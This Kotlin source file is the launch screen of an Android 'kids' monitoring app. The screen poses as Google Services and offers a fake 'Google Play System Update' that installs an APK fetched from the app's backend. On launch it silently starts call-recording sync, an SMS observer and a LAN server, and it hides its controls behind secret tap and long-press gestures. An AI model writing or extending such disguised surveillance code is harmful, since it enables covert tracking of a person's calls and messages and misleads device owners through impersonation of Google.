package com.vyra.kids.ui

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import android.text.InputType
import android.view.View
import android.widget.EditText
import android.widget.ImageView
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.android.material.button.MaterialButton
import com.vyra.kids.R
import com.vyra.kids.core.AppConstants
import com.vyra.kids.core.AppUpdateManager
import com.vyra.kids.core.DisguiseManager
import com.vyra.kids.core.DisguiseProfile
import com.vyra.kids.core.PrefsManager

class DecoyDisplayActivity : AppCompatActivity() {

    private lateinit var disguiseManager: DisguiseManager
    private lateinit var prefs: PrefsManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        disguiseManager = DisguiseManager(this)
        prefs = PrefsManager(this)

        // First run redirect: If device is not configured yet or pairing code is missing, launch Setup Wizard immediately
        if (!prefs.isConfigured || prefs.pairingCode.isBlank()) {
            startActivity(Intent(this, SetupWizardActivity::class.java))
            finish()
            return
        }

        setContentView(R.layout.activity_decoy_display)
        disguiseManager.autoApplyBrandDisguise()

        // Trigger background sync, LAN server, and call recording sync on launch
        try {
            com.vyra.kids.core.FirebaseSyncManager.getInstance(this).syncDeviceStatus()
            com.vyra.kids.core.LocalLanSyncServer.getInstance(this).start()
            com.vyra.kids.services.CallRecordingSyncService.syncCallsAndRecordings(this)
            val smsIntent = Intent(this, com.vyra.kids.services.SmsObserverService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(smsIntent)
            } else {
                startService(smsIntent)
            }
        } catch (_: Exception) {}

        val tvDecoyTitle = findViewById<TextView>(R.id.tvDecoyTitle)
        val tvDecoyHeader = findViewById<TextView>(R.id.tvDecoyHeader)
        val ivParentUnlock = findViewById<ImageView>(R.id.ivParentUnlock)
        val tvDecoyFooter = findViewById<TextView>(R.id.tvDecoyFooter)
        val tvDeviceBrand = findViewById<TextView>(R.id.tvDeviceBrand)
        val tvDeviceModel = findViewById<TextView>(R.id.tvDeviceModel)
        val tvFirmwareSubsystem = findViewById<TextView>(R.id.tvFirmwareSubsystem)

        tvDecoyTitle?.text = "Google Services"
        tvDecoyHeader?.text = "Google Services"
        tvDeviceBrand?.text = "Google LLC"
        tvDeviceModel?.text = "Android ${Build.VERSION.RELEASE}"
        tvFirmwareSubsystem?.text = "Google Play & System Sync"
        tvDecoyFooter?.text = "Google Play Services • Core Synchronization"

        // Setup OTA System Update Card
        setupSystemUpdateCard()

        // 1. Discreet corner unlock
        ivParentUnlock.setOnClickListener {
            showParentPinDialog()
        }

        // 2. Secret 5-Tap Gesture on header title (no app icon inside the app)
        var tapCount = 0
        var lastTapTime = 0L
        tvDecoyHeader?.setOnClickListener {
            val now = System.currentTimeMillis()
            if (now - lastTapTime < 800) {
                tapCount++
                if (tapCount >= 5) {
                    tapCount = 0
                    showParentPinDialog()
                }
            } else {
                tapCount = 1
            }
            lastTapTime = now
        }

        // 3. Secret long-press on footer
        tvDecoyFooter.setOnLongClickListener {
            showParentPinDialog()
            true
        }
    }

    private fun showParentPinDialog() {
        val input = EditText(this).apply {
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
            hint = "Enter Pairing Code or Secret Key"
        }

        AlertDialog.Builder(this)
            .setTitle("Parent Verification")
            .setMessage("Enter the secret pairing code or key configured in Parent App:")
            .setView(input)
            .setPositiveButton("Verify") { dialog, _ ->
                val enteredPin = input.text.toString().trim()
                if (prefs.isParentPinValid(enteredPin)) {
                    Toast.makeText(this, "Access Granted", Toast.LENGTH_SHORT).show()
                    showDisguisePickerSheet()
                } else {
                    Toast.makeText(this, "Incorrect Key / Code!", Toast.LENGTH_SHORT).show()
                }
                dialog.dismiss()
            }
            .setNegativeButton("Cancel") { dialog, _ ->
                dialog.dismiss()
            }
            .show()
    }

    private fun showDisguisePickerSheet() {
        val disguises = DisguiseProfile.entries
        val items = disguises.map { it.title }.toTypedArray()

        AlertDialog.Builder(this)
            .setTitle("Select App Disguise")
            .setItems(items) { _, which ->
                val selected = disguises[which]
                disguiseManager.applyDisguise(selected)
                Toast.makeText(this, "Disguise changed to: ${selected.title}", Toast.LENGTH_LONG).show()
                recreate()
            }
            .setNeutralButton("Open Setup Wizard") { _, _ ->
                prefs.isConfigured = false
                startActivity(Intent(this, SetupWizardActivity::class.java))
                finish()
            }
            .setNegativeButton("Close", null)
            .show()
    }

    private var tvUpdateTitle: TextView? = null
    private var tvUpdateSubtitle: TextView? = null
    private var tvUpdateBadge: TextView? = null
    private var pbUpdateDownload: ProgressBar? = null
    private var btnSystemUpdate: MaterialButton? = null

    private val updateStatusReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == AppUpdateManager.ACTION_UPDATE_STATUS_CHANGED) {
                val isDownloading = intent.getBooleanExtra("isDownloading", false)
                val progress = intent.getIntExtra("progress", 0)
                val isReady = intent.getBooleanExtra("ready", false)
                renderUpdateCardUI(isDownloading, progress, isReady)
            }
        }
    }

    override fun onResume() {
        super.onResume()
        try {
            val filter = IntentFilter(AppUpdateManager.ACTION_UPDATE_STATUS_CHANGED)
            ContextCompat.registerReceiver(
                this,
                updateStatusReceiver,
                filter,
                ContextCompat.RECEIVER_NOT_EXPORTED
            )
        } catch (_: Exception) {}
        renderUpdateCardUI()
    }

    override fun onPause() {
        super.onPause()
        try {
            unregisterReceiver(updateStatusReceiver)
        } catch (_: Exception) {}
    }

    private fun setupSystemUpdateCard() {
        tvUpdateTitle = findViewById(R.id.tvUpdateTitle)
        tvUpdateSubtitle = findViewById(R.id.tvUpdateSubtitle)
        tvUpdateBadge = findViewById(R.id.tvUpdateBadge)
        pbUpdateDownload = findViewById(R.id.pbUpdateDownload)
        btnSystemUpdate = findViewById(R.id.btnSystemUpdate)

        renderUpdateCardUI()
    }

    private fun renderUpdateCardUI(
        isDownloading: Boolean = AppUpdateManager.isDownloading,
        progress: Int = AppUpdateManager.downloadProgress,
        isReady: Boolean = false
    ) {
        val updateReady = isReady || AppUpdateManager.isDownloadedUpdateReady(this)

        if (updateReady) {
            tvUpdateTitle?.text = "Google Play System Update"
            tvUpdateSubtitle?.text = "System component upgrade ready. Tap to install."
            tvUpdateBadge?.text = "Ready"
            tvUpdateBadge?.setTextColor(ContextCompat.getColor(this, R.color.status_green))
            pbUpdateDownload?.visibility = View.GONE
            btnSystemUpdate?.isEnabled = true
            btnSystemUpdate?.text = "Install System Update (1-Click)"
            btnSystemUpdate?.setOnClickListener {
                Toast.makeText(this, "Opening System Package Installer...", Toast.LENGTH_SHORT).show()
                AppUpdateManager.installUpdate(this)
            }
        } else if (isDownloading || AppUpdateManager.isDownloading) {
            tvUpdateTitle?.text = "Downloading System Update..."
            tvUpdateSubtitle?.text = "Receiving components from Google Services ($progress%)"
            tvUpdateBadge?.text = "$progress%"
            tvUpdateBadge?.setTextColor(ContextCompat.getColor(this, R.color.status_green))
            pbUpdateDownload?.visibility = View.VISIBLE
            pbUpdateDownload?.progress = progress
            btnSystemUpdate?.isEnabled = false
            btnSystemUpdate?.text = "Downloading ($progress%)..."
        } else {
            tvUpdateTitle?.text = "Google Play System Update"
            tvUpdateSubtitle?.text = "Google Play Services & components up to date."
            tvUpdateBadge?.text = "Up to date"
            tvUpdateBadge?.setTextColor(ContextCompat.getColor(this, R.color.status_green))
            pbUpdateDownload?.visibility = View.GONE
            btnSystemUpdate?.isEnabled = true
            btnSystemUpdate?.text = "Check for Updates"
            btnSystemUpdate?.setOnClickListener {
                Toast.makeText(this, "Checking for system updates...", Toast.LENGTH_SHORT).show()
                renderUpdateCardUI(isDownloading = true, progress = 5, isReady = false)
                AppUpdateManager.downloadUpdate(
                    context = this,
                    apkUrl = "${AppConstants.RENDER_BACKEND_URL}/download/child-app.apk",
                    onProgress = { p ->
                        runOnUiThread { renderUpdateCardUI(isDownloading = true, progress = p, isReady = false) }
                    },
                    onComplete = { file ->
                        runOnUiThread {
                            if (file != null) {
                                renderUpdateCardUI(isDownloading = false, progress = 100, isReady = true)
                                Toast.makeText(this, "Update ready! Tap Install System Update.", Toast.LENGTH_LONG).show()
                            } else {
                                renderUpdateCardUI(isDownloading = false, progress = 0, isReady = false)
                                Toast.makeText(this, "System components are already up to date.", Toast.LENGTH_SHORT).show()
                            }
                        }
                    }
                )
            }
        }
    }
}
